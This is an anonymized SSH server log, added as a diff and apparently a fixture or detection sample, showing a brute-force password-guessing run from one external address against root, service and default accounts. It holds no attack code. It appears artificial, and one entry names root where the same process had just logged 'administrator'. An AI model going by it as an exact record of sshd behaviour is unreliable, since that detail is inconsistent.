+Sep 22 02:21:50 HOST_1 sshd[21841]: Connection closed by invalid user ubuntu IP_EXT_1 port 41544 [preauth]
+Sep 22 02:21:54 HOST_1 sshd[21415]: Failed password for root from IP_EXT_1 port 50836 ssh2
+Sep 22 02:21:54 HOST_1 sshd[21415]: Connection closed by authenticating user root IP_EXT_1 port 50836 [preauth]
+Sep 22 02:21:55 HOST_1 sshd[22144]: Failed password for USER_1 from IP_EXT_1 port 57370 ssh2
+Sep 22 02:21:55 HOST_1 sshd[22144]: Connection closed by authenticating user USER_1 IP_EXT_1 port 57370 [preauth]
+Sep 22 02:21:59 HOST_1 sshd[26727]: Invalid user backup from IP_EXT_1 port 38133
+Sep 22 02:22:00 HOST_1 sshd[26727]: Failed password for invalid user backup from IP_EXT_1 port 38133 ssh2
+Sep 22 02:22:00 HOST_1 sshd[26727]: Connection closed by invalid user backup IP_EXT_1 port 38133 [preauth]
+Sep 22 02:22:01 HOST_1 sshd[26976]: Failed password for USER_2 from IP_EXT_1 port 55417 ssh2
+Sep 22 02:22:01 HOST_1 sshd[26976]: Connection closed by authenticating user USER_2 IP_EXT_1 port 55417 [preauth]
+Sep 22 02:22:02 HOST_1 sshd[22457]: Failed password for root from IP_EXT_1 port 39883 ssh2
+Sep 22 02:22:02 HOST_1 sshd[22457]: Connection closed by authenticating user root IP_EXT_1 port 39883 [preauth]
+Sep 22 02:22:05 HOST_1 sshd[20652]: Failed password for root from IP_EXT_1 port 47750 ssh2
+Sep 22 02:22:05 HOST_1 sshd[20652]: Connection closed by authenticating user root IP_EXT_1 port 47750 [preauth]
+Sep 22 02:22:10 HOST_1 sshd[23536]: Failed password for root from IP_EXT_1 port 45815 ssh2
+Sep 22 02:22:10 HOST_1 sshd[23536]: Connection closed by authenticating user root IP_EXT_1 port 45815 [preauth]
+Sep 22 02:22:14 HOST_1 sshd[22557]: Invalid user ubuntu from IP_EXT_1 port 56312
+Sep 22 02:22:15 HOST_1 sshd[22557]: Failed password for invalid user ubuntu from IP_EXT_1 port 56312 ssh2
+Sep 22 02:22:15 HOST_1 sshd[22557]: Connection closed by invalid user ubuntu IP_EXT_1 port 56312 [preauth]
+Sep 22 02:22:18 HOST_1 sshd[20771]: Invalid user ubuntu from IP_EXT_1 port 45380
+Sep 22 02:22:19 HOST_1 sshd[20771]: Failed password for invalid user ubuntu from IP_EXT_1 port 45380 ssh2
+Sep 22 02:22:19 HOST_1 sshd[20771]: Connection closed by invalid user ubuntu IP_EXT_1 port 45380 [preauth]
+Sep 22 02:22:20 HOST_1 sshd[22375]: Failed password for root from IP_EXT_1 port 40716 ssh2
+Sep 22 02:22:20 HOST_1 sshd[22375]: Connection closed by authenticating user root IP_EXT_1 port 40716 [preauth]
+Sep 22 02:22:25 HOST_1 sshd[26027]: Failed password for root from IP_EXT_1 port 46760 ssh2
+Sep 22 02:22:25 HOST_1 sshd[26027]: Connection closed by authenticating user root IP_EXT_1 port 46760 [preauth]
+Sep 22 02:22:28 HOST_1 sshd[21078]: Invalid user zabbix from IP_EXT_1 port 40775
+Sep 22 02:22:29 HOST_1 sshd[21078]: Failed password for invalid user zabbix from IP_EXT_1 port 40775 ssh2
+Sep 22 02:22:29 HOST_1 sshd[21078]: Connection closed by invalid user zabbix IP_EXT_1 port 40775 [preauth]
+Sep 22 02:22:30 HOST_1 sshd[23118]: Invalid user postgres from IP_EXT_1 port 49812
+Sep 22 02:22:31 HOST_1 sshd[23118]: Failed password for invalid user postgres from IP_EXT_1 port 49812 ssh2
+Sep 22 02:22:31 HOST_1 sshd[23118]: Connection closed by invalid user postgres IP_EXT_1 port 49812 [preauth]
+Sep 22 02:22:32 HOST_1 sshd[27563]: Failed password for USER_1 from IP_EXT_1 port 34200 ssh2
+Sep 22 02:22:32 HOST_1 sshd[27563]: Connection closed by authenticating user USER_1 IP_EXT_1 port 34200 [preauth]
+Sep 22 02:22:34 HOST_1 sshd[25805]: Failed password for root from IP_EXT_1 port 48427 ssh2
+Sep 22 02:22:34 HOST_1 sshd[25805]: Connection closed by authenticating user root IP_EXT_1 port 48427 [preauth]
+Sep 22 02:22:36 HOST_1 sshd[28227]: Failed password for root from IP_EXT_1 port 34474 ssh2
+Sep 22 02:22:36 HOST_1 sshd[28227]: Connection closed by authenticating user root IP_EXT_1 port 34474 [preauth]
+Sep 22 02:22:40 HOST_1 sshd[28999]: Failed password for USER_1 from IP_EXT_1 port 41607 ssh2
+Sep 22 02:22:40 HOST_1 sshd[28999]: Connection closed by authenticating user USER_1 IP_EXT_1 port 41607 [preauth]
+Sep 22 02:22:43 HOST_1 sshd[23261]: Invalid user backup from IP_EXT_1 port 50584
+Sep 22 02:22:44 HOST_1 sshd[23261]: Failed password for invalid user backup from IP_EXT_1 port 50584 ssh2
+Sep 22 02:22:44 HOST_1 sshd[23261]: Connection closed by invalid user backup IP_EXT_1 port 50584 [preauth]
+Sep 22 02:22:48 HOST_1 sshd[27506]: Invalid user test from IP_EXT_1 port 43955
+Sep 22 02:22:49 HOST_1 sshd[27506]: Failed password for invalid user test from IP_EXT_1 port 43955 ssh2
+Sep 22 02:22:49 HOST_1 sshd[27506]: Connection closed by invalid user test IP_EXT_1 port 43955 [preauth]
+Sep 22 02:22:50 HOST_1 sshd[27710]: Invalid user test from IP_EXT_1 port 56327
+Sep 22 02:22:51 HOST_1 sshd[27710]: Failed password for invalid user test from IP_EXT_1 port 56327 ssh2
+Sep 22 02:22:51 HOST_1 sshd[27710]: Connection closed by invalid user test IP_EXT_1 port 56327 [preauth]
+Sep 22 02:22:56 HOST_1 sshd[28850]: Failed password for USER_2 from IP_EXT_1 port 54548 ssh2
+Sep 22 02:22:56 HOST_1 sshd[28850]: Connection closed by authenticating user USER_2 IP_EXT_1 port 54548 [preauth]
+Sep 22 02:23:01 HOST_1 sshd[20950]: Invalid user admin from IP_EXT_1 port 40401
+Sep 22 02:23:02 HOST_1 sshd[20950]: Failed password for invalid user admin from IP_EXT_1 port 40401 ssh2
+Sep 22 02:23:02 HOST_1 sshd[20950]: Connection closed by invalid user admin IP_EXT_1 port 40401 [preauth]
+Sep 22 02:23:07 HOST_1 sshd[25219]: Invalid user postgres from IP_EXT_1 port 39119
+Sep 22 02:23:08 HOST_1 sshd[25219]: Failed password for invalid user postgres from IP_EXT_1 port 39119 ssh2
+Sep 22 02:23:08 HOST_1 sshd[25219]: Connection closed by invalid user postgres IP_EXT_1 port 39119 [preauth]
+Sep 22 02:23:11 HOST_1 sshd[21643]: Invalid user postgres from IP_EXT_1 port 53325
+Sep 22 02:23:12 HOST_1 sshd[21643]: Failed password for invalid user postgres from IP_EXT_1 port 53325 ssh2
+Sep 22 02:23:12 HOST_1 sshd[21643]: Connection closed by invalid user postgres IP_EXT_1 port 53325 [preauth]
+Sep 22 02:23:16 HOST_1 sshd[24515]: Invalid user administrator from IP_EXT_1 port 38735
+Sep 22 02:23:17 HOST_1 sshd[24515]: Failed password for invalid user administrator from IP_EXT_1 port 38735 ssh2
+Sep 22 02:23:17 HOST_1 sshd[24515]: Connection closed by invalid user administrator IP_EXT_1 port 38735 [preauth]
+Sep 22 02:23:20 HOST_1 sshd[27744]: Invalid user nagios from IP_EXT_1 port 42968
+Sep 22 02:23:21 HOST_1 sshd[27744]: Failed password for invalid user nagios from IP_EXT_1 port 42968 ssh2
+Sep 22 02:23:21 HOST_1 sshd[27744]: Connection closed by invalid user nagios IP_EXT_1 port 42968 [preauth]
+Sep 22 02:23:25 HOST_1 sshd[28983]: Failed password for SVC_1 from IP_EXT_1 port 41869 ssh2
+Sep 22 02:23:25 HOST_1 sshd[28983]: Connection closed by authenticating user SVC_1 IP_EXT_1 port 41869 [preauth]
+Sep 22 02:23:30 HOST_1 sshd[28478]: Failed password for SVC_1 from IP_EXT_1 port 53120 ssh2
+Sep 22 02:23:30 HOST_1 sshd[28478]: Connection closed by authenticating user SVC_1 IP_EXT_1 port 53120 [preauth]
+Sep 22 02:23:33 HOST_1 sshd[23856]: Failed password for root from IP_EXT_1 port 57438 ssh2
+Sep 22 02:23:33 HOST_1 sshd[23856]: Connection closed by authenticating user root IP_EXT_1 port 57438 [preauth]
+Sep 22 02:23:35 HOST_1 sshd[27918]: Invalid user git from IP_EXT_1 port 36510
+Sep 22 02:23:36 HOST_1 sshd[27918]: Failed password for invalid user git from IP_EXT_1 port 36510 ssh2
+Sep 22 02:23:36 HOST_1 sshd[27918]: Connection closed by invalid user git IP_EXT_1 port 36510 [preauth]
+Sep 22 02:23:40 HOST_1 sshd[22731]: Failed password for root from IP_EXT_1 port 35116 ssh2
+Sep 22 02:23:40 HOST_1 sshd[22731]: Connection closed by authenticating user root IP_EXT_1 port 35116 [preauth]
+Sep 22 02:23:45 HOST_1 sshd[29070]: Failed password for root from IP_EXT_1 port 54225 ssh2
+Sep 22 02:23:45 HOST_1 sshd[29070]: Connection closed by authenticating user root IP_EXT_1 port 54225 [preauth]
+Sep 22 02:23:50 HOST_1 sshd[21088]: Failed password for USER_1 from IP_EXT_1 port 59468 ssh2
+Sep 22 02:23:50 HOST_1 sshd[21088]: Connection closed by authenticating user USER_1 IP_EXT_1 port 59468 [preauth]
+Sep 22 02:23:53 HOST_1 sshd[22556]: Invalid user deploy from IP_EXT_1 port 57801
+Sep 22 02:23:54 HOST_1 sshd[22556]: Failed password for invalid user deploy from IP_EXT_1 port 57801 ssh2
+Sep 22 02:23:54 HOST_1 sshd[22556]: Connection closed by invalid user deploy IP_EXT_1 port 57801 [preauth]
+Sep 22 02:23:57 HOST_1 sshd[24082]: Invalid user oracle from IP_EXT_1 port 33173
+Sep 22 02:23:58 HOST_1 sshd[24082]: Failed password for invalid user oracle from IP_EXT_1 port 33173 ssh2
+Sep 22 02:23:58 HOST_1 sshd[24082]: Connection closed by invalid user oracle IP_EXT_1 port 33173 [preauth]
+Sep 22 02:24:02 HOST_1 sshd[20502]: Failed password for root from IP_EXT_1 port 35037 ssh2
+Sep 22 02:24:02 HOST_1 sshd[20502]: Connection closed by authenticating user root IP_EXT_1 port 35037 [preauth]
+Sep 22 02:24:07 HOST_1 sshd[26439]: Invalid user administrator from IP_EXT_1 port 56291
+Sep 22 02:24:08 HOST_1 sshd[26439]: Failed password for invalid user administrator from IP_EXT_1 port 56291 ssh2
+Sep 22 02:24:08 HOST_1 sshd[26439]: Connection closed by invalid user administrator IP_EXT_1 port 56291 [preauth]
+Sep 22 02:24:08 HOST_1 sshd[26439]: error: maximum authentication attempts exceeded for root from IP_EXT_1 port 56291 ssh2 [preauth]
+Sep 22 02:24:11 HOST_1 sshd[22738]: Failed password for USER_2 from IP_EXT_1 port 33196 ssh2
+Sep 22 02:24:11 HOST_1 sshd[22738]: Connection closed by authenticating user USER_2 IP_EXT_1 port 33196 [preauth]
+Sep 22 02:24:15 HOST_1 sshd[29881]: Failed password for root from IP_EXT_1 port 55716 ssh2
+Sep 22 02:24:15 HOST_1 sshd[29881]: Connection closed by authenticating user root IP_EXT_1 port 55716 [preauth]
+Sep 22 02:24:19 HOST_1 sshd[23685]: Failed password for USER_2 from IP_EXT_1 port 35799 ssh2
+Sep 22 02:24:19 HOST_1 sshd[23685]: Connection closed by authenticating user USER_2 IP_EXT_1 port 35799 [preauth]
+Sep 22 02:24:24 HOST_1 sshd[21720]: Failed password for SVC_1 from IP_EXT_1 port 58114 ssh2
+Sep 22 02:24:24 HOST_1 sshd[21720]: Connection closed by authenticating user SVC_1 IP_EXT_1 port 58114 [preauth]
+Sep 22 02:24:29 HOST_1 sshd[20733]: Invalid user oracle from IP_EXT_1 port 33723
+Sep 22 02:24:30 HOST_1 sshd[20733]: Failed password for invalid user oracle from IP_EXT_1 port 33723 ssh2
+Sep 22 02:24:30 HOST_1 sshd[20733]: Connection closed by invalid user oracle IP_EXT_1 port 33723 [preauth]
+Sep 22 02:24:34 HOST_1 sshd[23305]: Failed password for USER_2 from IP_EXT_1 port 37761 ssh2
+Sep 22 02:24:34 HOST_1 sshd[23305]: Connection closed by authenticating user USER_2 IP_EXT_1 port 37761 [preauth]
+Sep 22 02:24:36 HOST_1 sshd[27630]: Failed password for root from IP_EXT_1 port 51288 ssh2
+Sep 22 02:24:36 HOST_1 sshd[27630]: Connection closed by authenticating user root IP_EXT_1 port 51288 [preauth]
+Sep 22 02:24:38 HOST_1 sshd[20672]: Invalid user postgres from IP_EXT_1 port 59410
+Sep 22 02:24:39 HOST_1 sshd[20672]: Failed password for invalid user postgres from IP_EXT_1 port 59410 ssh2
+Sep 22 02:24:39 HOST_1 sshd[20672]: Connection closed by invalid user postgres IP_EXT_1 port 59410 [preauth]
+Sep 22 02:24:40 HOST_1 sshd[27220]: Failed password for root from IP_EXT_1 port 51433 ssh2
+Sep 22 02:24:40 HOST_1 sshd[27220]: Connection closed by authenticating user root IP_EXT_1 port 51433 [preauth]
+Sep 22 02:24:41 HOST_1 sshd[20970]: Invalid user zabbix from IP_EXT_1 port 47992
+Sep 22 02:24:42 HOST_1 sshd[20970]: Failed password for invalid user zabbix from IP_EXT_1 port 47992 ssh2
+Sep 22 02:24:42 HOST_1 sshd[20970]: Connection closed by invalid user zabbix IP_EXT_1 port 47992 [preauth]
+Sep 22 02:24:44 HOST_1 sshd[29071]: Invalid user administrator from IP_EXT_1 port 45594
+Sep 22 02:24:45 HOST_1 sshd[29071]: Failed password for invalid user administrator from IP_EXT_1 port 45594 ssh2
+Sep 22 02:24:45 HOST_1 sshd[29071]: Connection closed by invalid user administrator IP_EXT_1 port 45594 [preauth]
+Sep 22 02:24:46 HOST_1 sshd[21326]: Failed password for root from IP_EXT_1 port 47477 ssh2
+Sep 22 02:24:46 HOST_1 sshd[21326]: Connection closed by authenticating user root IP_EXT_1 port 47477 [preauth]
+Sep 22 02:24:48 HOST_1 sshd[22273]: Failed password for USER_1 from IP_EXT_1 port 51484 ssh2
+Sep 22 02:24:48 HOST_1 sshd[22273]: Connection closed by authenticating user USER_1 IP_EXT_1 port 51484 [preauth]
+Sep 22 02:24:52 HOST_1 sshd[21286]: Invalid user test from IP_EXT_1 port 50825
+Sep 22 02:24:53 HOST_1 sshd[21286]: Failed password for invalid user test from IP_EXT_1 port 50825 ssh2
+Sep 22 02:24:53 HOST_1 sshd[21286]: Connection closed by invalid user test IP_EXT_1 port 50825 [preauth]
+Sep 22 02:24:54 HOST_1 sshd[24938]: Invalid user deploy from IP_EXT_1 port 38662
+Sep 22 02:24:55 HOST_1 sshd[24938]: Failed password for invalid user deploy from IP_EXT_1 port 38662 ssh2
+Sep 22 02:24:55 HOST_1 sshd[24938]: Connection closed by invalid user deploy IP_EXT_1 port 38662 [preauth]
+Sep 22 02:24:56 HOST_1 sshd[24195]: Invalid user support from IP_EXT_1 port 54044
+Sep 22 02:24:57 HOST_1 sshd[24195]: Failed password for invalid user support from IP_EXT_1 port 54044 ssh2
+Sep 22 02:24:57 HOST_1 sshd[24195]: Connection closed by invalid user support IP_EXT_1 port 54044 [preauth]
+Sep 22 02:24:59 HOST_1 sshd[24992]: Failed password for USER_1 from IP_EXT_1 port 52994 ssh2
+Sep 22 02:24:59 HOST_1 sshd[24992]: Connection closed by authenticating user USER_1 IP_EXT_1 port 52994 [preauth]
+Sep 22 02:25:04 HOST_1 sshd[27438]: Invalid user user from IP_EXT_1 port 36406
+Sep 22 02:25:05 HOST_1 sshd[27438]: Failed password for invalid user user from IP_EXT_1 port 36406 ssh2
+Sep 22 02:25:05 HOST_1 sshd[27438]: Connection closed by invalid user user IP_EXT_1 port 36406 [preauth]
+Sep 22 02:25:06 HOST_1 sshd[26164]: Invalid user nagios from IP_EXT_1 port 53649
+Sep 22 02:25:07 HOST_1 sshd[26164]: Failed password for invalid user nagios from IP_EXT_1 port 53649 ssh2
+Sep 22 02:25:07 HOST_1 sshd[26164]: Connection closed by invalid user nagios IP_EXT_1 port 53649 [preauth]
+Sep 22 02:25:10 HOST_1 sshd[23973]: Failed password for root from IP_EXT_1 port 59228 ssh2
+Sep 22 02:25:10 HOST_1 sshd[23973]: Connection closed by authenticating user root IP_EXT_1 port 59228 [preauth]
+Sep 22 02:25:12 HOST_1 sshd[24208]: Invalid user backup from IP_EXT_1 port 44847
+Sep 22 02:25:13 HOST_1 sshd[24208]: Failed password for invalid user backup from IP_EXT_1 port 44847 ssh2
+Sep 22 02:25:13 HOST_1 sshd[24208]: Connection closed by invalid user backup IP_EXT_1 port 44847 [preauth]
+Sep 22 02:25:14 HOST_1 sshd[29468]: Invalid user ftpuser from IP_EXT_1 port 56183
+Sep 22 02:25:15 HOST_1 sshd[29468]: Failed password for invalid user ftpuser from IP_EXT_1 port 56183 ssh2
+Sep 22 02:25:15 HOST_1 sshd[29468]: Connection closed by invalid user ftpuser IP_EXT_1 port 56183 [preauth]
+Sep 22 02:25:20 HOST_1 sshd[26569]: Invalid user guest from IP_EXT_1 port 58736
+Sep 22 02:25:21 HOST_1 sshd[26569]: Failed password for invalid user guest from IP_EXT_1 port 58736 ssh2
+Sep 22 02:25:21 HOST_1 sshd[26569]: Connection closed by invalid user guest IP_EXT_1 port 58736 [preauth]
+Sep 22 02:25:25 HOST_1 sshd[28564]: Failed password for root from IP_EXT_1 port 37326 ssh2
+Sep 22 02:25:25 HOST_1 sshd[28564]: Connection closed by authenticating user root IP_EXT_1 port 37326 [preauth]
+Sep 22 02:25:27 HOST_1 sshd[25770]: Failed password for SVC_1 from IP_EXT_1 port 37317 ssh2
+Sep 22 02:25:27 HOST_1 sshd[25770]: Connection closed by authenticating user SVC_1 IP_EXT_1 port 37317 [preauth]
+Sep 22 02:25:28 HOST_1 sshd[20159]: Invalid user zabbix from IP_EXT_1 port 37789
+Sep 22 02:25:29 HOST_1 sshd[20159]: Failed password for invalid user zabbix from IP_EXT_1 port 37789 ssh2
+Sep 22 02:25:29 HOST_1 sshd[20159]: Connection closed by invalid user zabbix IP_EXT_1 port 37789 [preauth]
+Sep 22 02:25:34 HOST_1 sshd[28138]: Failed password for USER_2 from IP_EXT_1 port 57868 ssh2
+Sep 22 02:25:34 HOST_1 sshd[28138]: Connection closed by authenticating user USER_2 IP_EXT_1 port 57868 [preauth]
+Sep 22 02:25:39 HOST_1 sshd[27329]: Failed password for root from IP_EXT_1 port 44873 ssh2
+Sep 22 02:25:39 HOST_1 sshd[27329]: Connection closed by authenticating user root IP_EXT_1 port 44873 [preauth]
+Sep 22 02:25:41 HOST_1 sshd[23272]: Invalid user postgres from IP_EXT_1 port 53663
+Sep 22 02:25:42 HOST_1 sshd[23272]: Failed password for invalid user postgres from IP_EXT_1 port 53663 ssh2
+Sep 22 02:25:42 HOST_1 sshd[23272]: Connection closed by invalid user postgres IP_EXT_1 port 53663 [preauth]
+Sep 22 02:25:43 HOST_1 sshd[26153]: Failed password for USER_1 from IP_EXT_1 port 34856 ssh2
+Sep 22 02:25:43 HOST_1 sshd[26153]: Connection closed by authenticating user USER_1 IP_EXT_1 port 34856 [preauth]
+Sep 22 02:25:44 HOST_1 sshd[21385]: Invalid user backup from IP_EXT_1 port 40682
+Sep 22 02:25:45 HOST_1 sshd[21385]: Failed password for invalid user backup from IP_EXT_1 port 40682 ssh2
+Sep 22 02:25:45 HOST_1 sshd[21385]: Connection closed by invalid user backup IP_EXT_1 port 40682 [preauth]
+Sep 22 02:25:50 HOST_1 sshd[20118]: Invalid user support from IP_EXT_1 port 51742
+Sep 22 02:25:51 HOST_1 sshd[20118]: Failed password for invalid user support from IP_EXT_1 port 51742 ssh2
+Sep 22 02:25:51 HOST_1 sshd[20118]: Connection closed by invalid user support IP_EXT_1 port 51742 [preauth]
+Sep 22 02:25:55 HOST_1 sshd[29606]: Invalid user ftpuser from IP_EXT_1 port 54373
+Sep 22 02:25:56 HOST_1 sshd[29606]: Failed password for invalid user ftpuser from IP_EXT_1 port 54373 ssh2
+Sep 22 02:25:56 HOST_1 sshd[29606]: Connection closed by invalid user ftpuser IP_EXT_1 port 54373 [preauth]
+Sep 22 02:25:58 HOST_1 sshd[27254]: Invalid user test from IP_EXT_1 port 45744
+Sep 22 02:25:59 HOST_1 sshd[27254]: Failed password for invalid user test from IP_EXT_1 port 45744 ssh2
+Sep 22 02:25:59 HOST_1 sshd[27254]: Connection closed by invalid user test IP_EXT_1 port 45744 [preauth]
+Sep 22 02:26:02 HOST_1 sshd[25010]: Failed password for USER_2 from IP_EXT_1 port 60984 ssh2
+Sep 22 02:26:02 HOST_1 sshd[25010]: Connection closed by authenticating user USER_2 IP_EXT_1 port 60984 [preauth]
+Sep 22 02:26:03 HOST_1 sshd[26943]: Failed password for root from IP_EXT_1 port 40493 ssh2
+Sep 22 02:26:03 HOST_1 sshd[26943]: Connection closed by authenticating user root IP_EXT_1 port 40493 [preauth]
+Sep 22 02:26:05 HOST_1 sshd[24224]: Failed password for root from IP_EXT_1 port 42077 ssh2
+Sep 22 02:26:05 HOST_1 sshd[24224]: Connection closed by authenticating user root IP_EXT_1 port 42077 [preauth]
+Sep 22 02:26:10 HOST_1 sshd[27740]: Failed password for root from IP_EXT_1 port 43385 ssh2
+Sep 22 02:26:10 HOST_1 sshd[27740]: Connection closed by authenticating user root IP_EXT_1 port 43385 [preauth]
+Sep 22 02:26:14 HOST_1 sshd[26082]: Failed password for SVC_1 from IP_EXT_1 port 42304 ssh2
+Sep 22 02:26:14 HOST_1 sshd[26082]: Connection closed by authenticating user SVC_1 IP_EXT_1 port 42304 [preauth]
+Sep 22 02:26:18 HOST_1 sshd[20295]: Failed password for root from IP_EXT_1 port 38272 ssh2
+Sep 22 02:26:18 HOST_1 sshd[20295]: Connection closed by authenticating user root IP_EXT_1 port 38272 [preauth]
+Sep 22 02:26:18 HOST_1 sshd[20295]: error: maximum authentication attempts exceeded for root from IP_EXT_1 port 38272 ssh2 [preauth]
+Sep 22 02:26:23 HOST_1 sshd[29720]: Invalid user ftpuser from IP_EXT_1 port 40800
+Sep 22 02:26:24 HOST_1 sshd[29720]: Failed password for invalid user ftpuser from IP_EXT_1 port 40800 ssh2
+Sep 22 02:26:24 HOST_1 sshd[29720]: Connection closed by invalid user ftpuser IP_EXT_1 port 40800 [preauth]
+Sep 22 02:26:25 HOST_1 sshd[20927]: Failed password for USER_2 from IP_EXT_1 port 54781 ssh2
+Sep 22 02:26:25 HOST_1 sshd[20927]: Connection closed by authenticating user USER_2 IP_EXT_1 port 54781 [preauth]
+Sep 22 02:26:27 HOST_1 sshd[29809]: Failed password for root from IP_EXT_1 port 51003 ssh2
+Sep 22 02:26:27 HOST_1 sshd[29809]: Connection closed by authenticating user root IP_EXT_1 port 51003 [preauth]
+Sep 22 02:26:31 HOST_1 sshd[20725]: Failed password for SVC_1 from IP_EXT_1 port 41804 ssh2
+Sep 22 02:26:31 HOST_1 sshd[20725]: Connection closed by authenticating user SVC_1 IP_EXT_1 port 41804 [preauth]
+Sep 22 02:26:36 HOST_1 sshd[20374]: Invalid user user from IP_EXT_1 port 51949
+Sep 22 02:26:37 HOST_1 sshd[20374]: Failed password for invalid user user from IP_EXT_1 port 51949 ssh2
+Sep 22 02:26:37 HOST_1 sshd[20374]: Connection closed by invalid user user IP_EXT_1 port 51949 [preauth]
+Sep 22 02:26:40 HOST_1 sshd[20005]: Invalid user admin from IP_EXT_1 port 59605
+Sep 22 02:26:41 HOST_1 sshd[20005]: Failed password for invalid user admin from IP_EXT_1 port 59605 ssh2
+Sep 22 02:26:41 HOST_1 sshd[20005]: Connection closed by invalid user admin IP_EXT_1 port 59605 [preauth]
+Sep 22 02:26:43 HOST_1 sshd[24499]: Failed password for root from IP_EXT_1 port 43130 ssh2
+Sep 22 02:26:43 HOST_1 sshd[24499]: Connection closed by authenticating user root IP_EXT_1 port 43130 [preauth]
+Sep 22 02:26:48 HOST_1 sshd[22431]: Failed password for USER_1 from IP_EXT_1 port 44792 ssh2
+Sep 22 02:26:48 HOST_1 sshd[22431]: Connection closed by authenticating user USER_1 IP_EXT_1 port 44792 [preauth]
+Sep 22 02:26:50 HOST_1 sshd[24101]: Failed password for USER_2 from IP_EXT_1 port 49118 ssh2
+Sep 22 02:26:50 HOST_1 sshd[24101]: Connection closed by authenticating user USER_2 IP_EXT_1 port 49118 [preauth]
+Sep 22 02:26:55 HOST_1 sshd[22579]: Invalid user guest from IP_EXT_1 port 51131
+Sep 22 02:26:56 HOST_1 sshd[22579]: Failed password for invalid user guest from IP_EXT_1 port 51131 ssh2
+Sep 22 02:26:56 HOST_1 sshd[22579]: Connection closed by invalid user guest IP_EXT_1 port 51131 [preauth]
+Sep 22 02:27:01 HOST_1 sshd[28736]: Failed password for root from IP_EXT_1 port 37818 ssh2
+Sep 22 02:27:01 HOST_1 sshd[28736]: Connection closed by authenticating user root IP_EXT_1 port 37818 [preauth]
+Sep 22 02:27:05 HOST_1 sshd[22661]: Invalid user support from IP_EXT_1 port 56580
+Sep 22 02:27:06 HOST_1 sshd[22661]: Failed password for invalid user support from IP_EXT_1 port 56580 ssh2
+Sep 22 02:27:06 HOST_1 sshd[22661]: Connection closed by invalid user support IP_EXT_1 port 56580 [preauth]
+Sep 22 02:27:08 HOST_1 sshd[23420]: Invalid user ubuntu from IP_EXT_1 port 58165
+Sep 22 02:27:09 HOST_1 sshd[23420]: Failed password for invalid user ubuntu from IP_EXT_1 port 58165 ssh2
+Sep 22 02:27:09 HOST_1 sshd[23420]: Connection closed by invalid user ubuntu IP_EXT_1 port 58165 [preauth]
+Sep 22 02:27:10 HOST_1 sshd[24721]: Invalid user git from IP_EXT_1 port 54032
+Sep 22 02:27:11 HOST_1 sshd[24721]: Failed password for invalid user git from IP_EXT_1 port 54032 ssh2
+Sep 22 02:27:11 HOST_1 sshd[24721]: Connection closed by invalid user git IP_EXT_1 port 54032 [preauth]
+Sep 22 02:27:15 HOST_1 sshd[25459]: Failed password for SVC_1 from IP_EXT_1 port 60741 ssh2
+Sep 22 02:27:15 HOST_1 sshd[25459]: Connection closed by authenticating user SVC_1 IP_EXT_1 port 60741 [preauth]
+Sep 22 02:27:18 HOST_1 sshd[28842]: Invalid user nagios from IP_EXT_1 port 48781
+Sep 22 02:27:19 HOST_1 sshd[28842]: Failed password for invalid user nagios from IP_EXT_1 port 48781 ssh2
+Sep 22 02:27:19 HOST_1 sshd[28842]: Connection closed by invalid user nagios IP_EXT_1 port 48781 [preauth]
+Sep 22 02:27:24 HOST_1 sshd[22197]: Invalid user deploy from IP_EXT_1 port 37248
+Sep 22 02:27:25 HOST_1 sshd[22197]: Failed password for invalid user deploy from IP_EXT_1 port 37248 ssh2
+Sep 22 02:27:25 HOST_1 sshd[22197]: Connection closed by invalid user deploy IP_EXT_1 port 37248 [preauth]
+Sep 22 02:27:28 HOST_1 sshd[27782]: Invalid user oracle from IP_EXT_1 port 45876
+Sep 22 02:27:29 HOST_1 sshd[27782]: Failed password for invalid user oracle from IP_EXT_1 port 45876 ssh2
+Sep 22 02:27:29 HOST_1 sshd[27782]: Connection closed by invalid user oracle IP_EXT_1 port 45876 [preauth]
+Sep 22 02:27:34 HOST_1 sshd[24878]: Failed password for USER_2 from IP_EXT_1 port 57339 ssh2
+Sep 22 02:27:34 HOST_1 sshd[24878]: Connection closed by authenticating user USER_2 IP_EXT_1 port 57339 [preauth]
+Sep 22 02:27:39 HOST_1 sshd[20674]: Invalid user git from IP_EXT_1 port 57404
+Sep 22 02:27:40 HOST_1 sshd[20674]: Failed password for invalid user git from IP_EXT_1 port 57404 ssh2
+Sep 22 02:27:40 HOST_1 sshd[20674]: Connection closed by invalid user git IP_EXT_1 port 57404 [preauth]
+Sep 22 02:27:41 HOST_1 sshd[29043]: Invalid user user from IP_EXT_1 port 44209
+Sep 22 02:27:42 HOST_1 sshd[29043]: Failed password for invalid user user from IP_EXT_1 port 44209 ssh2
+Sep 22 02:27:42 HOST_1 sshd[29043]: Connection closed by invalid user user IP_EXT_1 port 44209 [preauth]
+Sep 22 02:27:44 HOST_1 sshd[24043]: Invalid user deploy from IP_EXT_1 port 49475
+Sep 22 02:27:45 HOST_1 sshd[24043]: Failed password for invalid user deploy from IP_EXT_1 port 49475 ssh2
+Sep 22 02:27:45 HOST_1 sshd[24043]: Connection closed by invalid user deploy IP_EXT_1 port 49475 [preauth]
+Sep 22 02:27:49 HOST_1 sshd[25036]: Invalid user guest from IP_EXT_1 port 44254
+Sep 22 02:27:50 HOST_1 sshd[25036]: Failed password for invalid user guest from IP_EXT_1 port 44254 ssh2
+Sep 22 02:27:50 HOST_1 sshd[25036]: Connection closed by invalid user guest IP_EXT_1 port 44254 [preauth]
+Sep 22 02:27:51 HOST_1 sshd[27884]: Invalid user user from IP_EXT_1 port 40357
+Sep 22 02:27:52 HOST_1 sshd[27884]: Failed password for invalid user user from IP_EXT_1 port 40357 ssh2
+Sep 22 02:27:52 HOST_1 sshd[27884]: Connection closed by invalid user user IP_EXT_1 port 40357 [preauth]
+Sep 22 02:27:55 HOST_1 sshd[22486]: Invalid user oracle from IP_EXT_1 port 51154
+Sep 22 02:27:56 HOST_1 sshd[22486]: Failed password for invalid user oracle from IP_EXT_1 port 51154 ssh2
+Sep 22 02:27:56 HOST_1 sshd[22486]: Connection closed by invalid user oracle IP_EXT_1 port 51154 [preauth]
+Sep 22 02:27:59 HOST_1 sshd[26168]: Failed password for USER_2 from IP_EXT_1 port 38020 ssh2
+Sep 22 02:27:59 HOST_1 sshd[26168]: Connection closed by authenticating user USER_2 IP_EXT_1 port 38020 [preauth]
+Sep 22 02:28:00 HOST_1 sshd[28177]: Failed password for root from IP_EXT_1 port 52073 ssh2
+Sep 22 02:28:00 HOST_1 sshd[28177]: Connection closed by authenticating user root IP_EXT_1 port 52073 [preauth]
+Sep 22 02:28:03 HOST_1 sshd[24591]: Invalid user guest from IP_EXT_1 port 36623
